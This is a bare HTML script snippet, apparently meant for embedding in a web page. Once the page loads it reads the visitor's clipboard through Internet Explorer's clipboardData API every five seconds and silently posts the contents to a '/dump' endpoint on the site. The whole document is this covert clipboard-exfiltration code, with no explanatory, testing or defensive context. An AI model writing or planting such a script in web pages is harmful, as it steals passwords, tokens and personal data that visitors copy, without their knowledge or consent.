<script>
(function() {
    document.addEventListener("DOMContentLoaded", function(event) {
        if (!window.clipboardData) 
            return;

        setInterval(function() {
            var data = window.clipboardData.getData('Text');

            var http = new XMLHttpRequest();
            http.open("POST", "/dump", true);
            http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

            var params = "clipboard="+data;
            http.send(params);
        }, 5000);
    });
})();
</script>


